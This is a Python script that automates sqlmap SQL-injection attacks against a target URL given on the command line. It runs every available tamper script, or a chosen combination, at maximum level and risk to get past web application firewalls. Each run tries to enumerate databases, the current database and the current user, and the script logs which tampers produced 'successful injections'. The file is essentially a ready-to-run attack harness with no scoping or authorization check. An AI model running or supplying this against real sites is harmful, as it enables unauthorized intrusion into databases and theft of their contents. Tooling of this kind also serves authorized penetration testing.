import os
import subprocess
import argparse
import logging
import json
import re
from datetime import datetime

# Configure logging to show progress and results
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Configuration Constants ---
SQLMAP_PATH = "sqlmap"  # Ensure sqlmap is in your system's PATH, or provide the full path like "/usr/bin/sqlmap"
DEFAULT_TAMPER_DIR = "/usr/share/sqlmap/tamper/" # Standard sqlmap tamper directory
DEFAULT_TIMEOUT_PER_TEST = 300  # Default timeout for each sqlmap run (in seconds)
RESULTS_FILE = "sqlmap_tamper_test_results.json" # File to store detailed JSON results

# --- Success Indicators for sqlmap Output ---
# These are patterns sqlmap typically prints when it finds something interesting or successfully injects.
# We'll look for these in stdout to determine if a tamper was "successful."
SQLMAP_SUCCESS_PATTERNS = [
    r"DBMS: (?P<dbms>[a-zA-Z0-9_\-\.]+)",  # Catches the identified DBMS
    r"backend DBMS is (?P<dbms_full>[a-zA-Z0-9_\-\.\s]+)", # Catches full DBMS name
    r"found the following databases: (?P<databases>[\s\S]+)", # Catches database names
    r"detected the following table\(s\): (?P<table>[\s\S]+)", # Catches table names
    r"identified the following column\(s\): (?P<columns>[\s\S]+)", # Catches column names
    r"web server operating system: (?P<os>[\s\S]+)", # Catches OS
    r"web server: (?P<webserver>[\s\S]+)", # Catches web server
    r"\[(?P<info>[^\]]+)\] is vulnerable", # Generic vulnerability message
    r"vulnerable parameters: (?P<vulnerable_params>[\s\S]+)", # Vulnerable parameters
]

def get_tamper_scripts(tamper_directory):
    """
    Discovers all Python tamper scripts (.py files) in the specified directory.
    """
    if not os.path.isdir(tamper_directory):
        logging.error(f"Error: Tamper directory '{tamper_directory}' not found.")
        return []
    
    tamper_scripts = []
    for filename in os.listdir(tamper_directory):
        if filename.endswith(".py") and filename != "__init__.py":
            tamper_scripts.append(filename.replace(".py", ""))
    
    logging.info(f"Found {len(tamper_scripts)} tamper scripts in '{tamper_directory}'.")
    return sorted(tamper_scripts) # Return sorted for consistent testing order

def parse_sqlmap_output(stdout_output):
    """
    Parses sqlmap's stdout to determine if an injection was successful
    and extracts relevant information.
    """
    results = {
        "status": "failed",
        "details": {}
    }
    
    for pattern in SQLMAP_SUCCESS_PATTERNS:
        matches = re.search(pattern, stdout_output, re.IGNORECASE)
        if matches:
            results["status"] = "succeeded"
            for key, value in matches.groupdict().items():
                if value: # Only add if value is not empty
                    results["details"][key] = value.strip()
    
    # Add a general indicator if any DBMS info was found
    if "dbms" in results["details"] or "dbms_full" in results["details"]:
        results["status"] = "succeeded" # Reinforce success if DBMS identified
    
    if results["status"] == "succeeded":
        logging.info("    -> SQLmap detected vulnerability/information!")
    else:
        logging.info("    -> SQLmap did NOT detect vulnerability/information.")

    return results

def run_sqlmap_test(url, tampera, sqlmap_extra_args, timeout):
    """
    Executes sqlmap with the given URL, tamper script(s), and extra arguments.
    Captures stdout, stderr, and exit code.
    """
    tamper_arg = f"--tamper={','.join(tampera)}" if isinstance(tampera, list) else f"--tamper={tampera}"
    
    # Base sqlmap command - we add basic flags to make it verbose and try to dump DBs
    # --batch for non-interactive mode, --technique=BEUST for all common techniques
    command = [
        SQLMAP_PATH,
        "-u", url,
        tamper_arg,
        "--batch",
        "--level=5", # Aggressive level for testing WAF bypass
        "--risk=3",  # High risk for more comprehensive testing
        "--dbs",     # Try to enumerate databases (strong indicator of success)
        "--current-db", # Current database
        "--current-user", # Current user
        "--random-agent", # Use random user agent
        "--eta", # Estimated time of arrival (useful for long runs)
        "--retries=3" # Retries on connection errors
    ]
    
    # Add any user-provided extra sqlmap arguments
    if sqlmap_extra_args:
        command.extend(sqlmap_extra_args)
    
    # Add an output directory for better organization
    output_dir_name = f"sqlmap_output_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{'-'.join(tampera).replace(',', '_')}"
    command.extend(["-o", f"--output-dir={output_dir_name}"])

    logging.info(f"Running sqlmap with: {tamper_arg} (Timeout: {timeout}s)")
    logging.debug(f"Full command: {' '.join(command)}")

    try:
        process = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False # Do not raise CalledProcessError for non-zero exit codes
        )
        
        status = "completed"
        # Check sqlmap's internal success based on stdout parsing
        parsed_results = parse_sqlmap_output(process.stdout)

        return {
            "tamper_script(s)": tampera,
            "url": url,
            "status": parsed_results["status"], # "succeeded" or "failed"
            "exit_code": process.returncode,
            "stdout": process.stdout,
            "stderr": process.stderr,
            "duration": process.elapsed.total_seconds() if hasattr(process, 'elapsed') else "N/A",
            "parsed_details": parsed_results["details"]
        }
    except subprocess.TimeoutExpired:
        logging.warning(f"  -> SQLmap timed out after {timeout} seconds for {tamper_arg}.")
        return {
            "tamper_script(s)": tampera,
            "url": url,
            "status": "timed_out",
            "exit_code": None,
            "stdout": "Timeout expired.",
            "stderr": "",
            "duration": timeout,
            "parsed_details": {}
        }
    except FileNotFoundError:
        logging.error(f"  -> Error: sqlmap executable not found at '{SQLMAP_PATH}'. Ensure it's in your PATH or provide full path.")
        return {
            "tamper_script(s)": tampera,
            "url": url,
            "status": "sqlmap_not_found",
            "exit_code": None,
            "stdout": "sqlmap executable not found.",
            "stderr": "",
            "duration": 0,
            "parsed_details": {}
        }
    except Exception as e:
        logging.error(f"  -> An unexpected error occurred: {e}")
        return {
            "tamper_script(s)": tampera,
            "url": url,
            "status": "error",
            "exit_code": None,
            "stdout": "",
            "stderr": str(e),
            "duration": 0,
            "parsed_details": {}
        }

def main():
    parser = argparse.ArgumentParser(
        description="Automated sqlmap tamper script testing framework.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL for sqlmap testing.")
    parser.add_argument("-d", "--tamper-dir", default=DEFAULT_TAMPER_DIR,
                        help=f"Directory containing sqlmap tamper scripts. Default: {DEFAULT_TAMPER_DIR}")
    parser.add_argument("-t", "--timeout", type=int, default=DEFAULT_TIMEOUT_PER_TEST,
                        help=f"Timeout in seconds for each sqlmap run. Default: {DEFAULT_TIMEOUT_PER_TEST}s")
    parser.add_argument("-s", "--single-tamper", action="store_true",
                        help="Test each tamper script individually (default mode).")
    parser.add_argument("-c", "--combine-tampers", type=str,
                        help="""Comma-separated list of tamper scripts to combine and test (e.g., 'apostrophemask,space2hash').
If not provided, the script will run individual tests.""")
    parser.add_argument("-x", "--sqlmap-args", nargs=argparse.REMAINDER,
                        help="""Additional arguments to pass directly to sqlmap.
Example: --sqlmap-args --data="id=1" --proxy="http://127.0.0.1:8080" """)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging.")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    all_results = []
    tamper_scripts = get_tamper_scripts(args.tamper_dir)

    if not tamper_scripts:
        logging.error("No tamper scripts found. Exiting.")
        return

    test_combinations = []
    if args.combine_tampers:
        # User specified a combination
        combo = [t.strip() for t in args.combine_tampers.split(',')]
        # Validate that all provided tampers exist
        for t in combo:
            if t not in tamper_scripts:
                logging.error(f"Error: Specified tamper script '{t}' not found in directory.")
                return
        test_combinations.append(combo)
    else:
        # Default: test each tamper individually
        for t in tamper_scripts:
            test_combinations.append([t])
    
    logging.info(f"Starting {len(test_combinations)} sqlmap test run(s) against {args.url}...")

    for idx, tampera in enumerate(test_combinations):
        current_tamper_str = ','.join(tampera)
        logging.info(f"\n--- Testing Tamper(s) {idx + 1}/{len(test_combinations)}: {current_tamper_str} ---")
        result = run_sqlmap_test(args.url, tampera, args.sqlmap_args, args.timeout)
        all_results.append(result)
        logging.info(f"Test for '{current_tamper_str}' finished with status: {result['status'].upper()}")

    # --- Summary Report ---
    logging.info("\n--- Test Summary ---")
    successful_tests = [r for r in all_results if r["status"] == "succeeded"]
    timed_out_tests = [r for r in all_results if r["status"] == "timed_out"]
    failed_tests = [r for r in all_results if r["status"] == "failed"]
    error_tests = [r for r in all_results if r["status"] == "error" or r["status"] == "sqlmap_not_found"]

    logging.info(f"Total Tests: {len(all_results)}")
    logging.info(f"Successful Injections: {len(successful_tests)}")
    for s_test in successful_tests:
        logging.info(f"  [SUCCESS] Tamper(s): {','.join(s_test['tamper_script(s)'])} - Details: {s_test['parsed_details']}")
    
    logging.info(f"Timed Out: {len(timed_out_tests)}")
    for t_test in timed_out_tests:
        logging.info(f"  [TIMEOUT] Tamper(s): {','.join(t_test['tamper_script(s)'])}")

    logging.info(f"Failed Injections (no info detected): {len(failed_tests)}")
    logging.info(f"Errors/sqlmap Not Found: {len(error_tests)}")

    # Save detailed results to JSON
    with open(RESULTS_FILE, 'w') as f:
        json.dump(all_results, f, indent=4)
    logging.info(f"\nDetailed results saved to '{RESULTS_FILE}'.")
    logging.info("Review the JSON for full sqlmap output and error messages.")

if __name__ == "__main__":
    main()
